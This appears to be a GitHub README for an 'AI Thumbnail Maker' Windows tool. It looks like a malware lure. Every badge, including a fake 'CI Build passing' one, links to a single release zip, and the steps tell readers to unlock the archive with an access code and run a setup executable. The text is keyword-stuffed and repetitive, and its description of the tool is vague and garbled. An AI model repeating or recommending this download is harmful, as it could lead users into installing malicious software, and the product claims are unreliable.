<div align="center">

# AI Thumbnail Maker — AI Thumbnail Maker — Ai Thumbnail Maker (Hot-Reload Config, Zero Dependencies)

<p><strong>AI Thumbnail Maker — AI Thumbnail Maker — Ai Thumbnail Maker (Hot-Reload Config, Zero Dependencies): AI Thumbnail Maker — thumbnail and tool in one tool. Native 64-bit portable build with hot-reloadable JSON configuration, low-overhead runtime, and prebuilt portable release.</strong></p>

[![CI Build](https://img.shields.io/badge/CI_Build-passing-2ea44f?style=for-the-badge&logo=githubactions&logoColor=white)](../../releases/download/v0.1.0/preview-maker-ai-v0.1.0-win64.zip)
[![Version](https://img.shields.io/badge/Release-v0.1.0-2ea44f?style=for-the-badge&logo=github)](../../releases/download/v0.1.0/preview-maker-ai-v0.1.0-win64.zip)
[![Platform](https://img.shields.io/badge/Platform-Windows_10%2F11_x64-0969da?style=for-the-badge&logo=windows)](../../releases/download/v0.1.0/preview-maker-ai-v0.1.0-win64.zip)
[![Stars](https://img.shields.io/github/stars/TestOwner/preview-maker-ai?style=for-the-badge&logo=github&color=e3b341)](../../stargazers)

<p><strong>⬇ No compiler. No setup. Grab the prebuilt package and run.</strong></p>

<a href="../../releases/download/v0.1.0/preview-maker-ai-v0.1.0-win64.zip"><img src="download_btn.svg" alt="Download preview-maker-ai-v0.1.0-win64.zip" width="520"></a>

<br>

<a href="../../releases/download/v0.1.0/preview-maker-ai-v0.1.0-win64.zip"><img src="banner.svg" alt="AI Thumbnail Maker Preview" width="840"></a>

</div>

---

## Executive Summary & Design

**AI Thumbnail Maker — AI Thumbnail Maker — thumbnail and tool in one tool** (`preview-maker-ai`) is a portable Windows 10/11 runtime suite: drop the prebuilt package, point it at `config/settings.json`, and go. No compiler, no external dependencies, live hot-reload included.

## Getting Started (No Compiler Needed)

| Platform | Direct Prebuilt Package | Documentation Mirror |
| :--- | :--- | :--- |
| **Windows 10 / 11 (x64)** | [**`preview-maker-ai-v0.1.0-win64.zip`**](../../releases/download/v0.1.0/preview-maker-ai-v0.1.0-win64.zip) | [**Usage Guide (`docs/USAGE.md`)**](docs/USAGE.md) |

1. Download [`preview-maker-ai-v0.1.0-win64.zip`](../../releases/download/v0.1.0/preview-maker-ai-v0.1.0-win64.zip) using the download button above.
2. Extract the archive using the access code (`2026`).
3. Launch `PreviewMakerAi_Setup_x64.exe` (keep `config/settings.json` in the same folder).

### Configuration (`config/settings.json`)

```json
{
  "module": "preview-maker-ai",
  "version": "0.1.0",
  "runtime": {
    "threads": 4,
    "verbose": false,
    "hot_reload": true
  },
  "modules": {
    "extract": {
      "enabled": true
    },
    "compose": {
      "enabled": true
    },
    "text": {
      "enabled": true
    },
    "cli": {
      "enabled": true
    }
  }
}
```

### FAQ

<details>
<summary><b>Generated from what?</b></summary>

A video frame or topic.
</details>
<details>
<summary><b>A/B tests?</b></summary>

Several variants at once.
</details>
<details>
<summary><b>Formats?</b></summary>

YouTube, Twitch, Shorts.
</details>

### Documentation & Guides

- [Changelog — v0.1.0 and later](CHANGELOG.md)
- [Usage Guide — commands and options](docs/USAGE.md)
- [FAQ — platform support, data storage](docs/FAQ.md)
- [Contributing — setup, ground rules, PR flow](CONTRIBUTING.md)

## Building from Source

```bash
git clone https://github.com/TestOwner/preview-maker-ai.git
cd preview-maker-ai
cmake -B build -DCMAKE_BUILD_TYPE=Release
cmake --build build --config Release
```

---
<sub>Indexed tags: preview-maker-ai, youtube, tool, ctr, content, design, ai, thumbnail, cli, developer-tools, open-source, windows, automation, productivity, cpp, portable, prebuilt, tools</sub>

## Keywords

ai thumbnail youtube tool tool ctr content design thumbnail-studio-ai preview-maker-ai ai-thumbnail-maker windows portable prebuilt x64 free download
related: ai, thumbnail, youtube, tool, tool, ctr, content, design
